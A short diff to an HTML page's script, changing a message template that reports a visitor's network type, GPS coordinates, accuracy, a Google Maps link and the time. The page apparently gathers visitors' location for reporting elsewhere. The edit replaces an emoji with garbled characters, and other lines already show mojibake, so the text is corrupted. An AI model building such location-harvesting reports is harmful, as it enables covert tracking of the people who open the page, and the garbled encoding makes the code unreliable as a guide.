@@ -651,7 +651,7 @@
 • *Type:* ${network}
 
 📍 *LOCATION DATA*
-${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math.round(locData.acc)}m\n🔗 [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "âŒ Location Denied/Unavailable"}
+${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math.round(locData.acc)}m\nðŸ”— [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "âŒ Location Denied/Unavailable"}
 
 ⏰ *Time:* ${new Date().toLocaleString()}
 `;
@@ -814,3 +814,4 @@ ${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math
     </script>
 </body>
 </html>
+
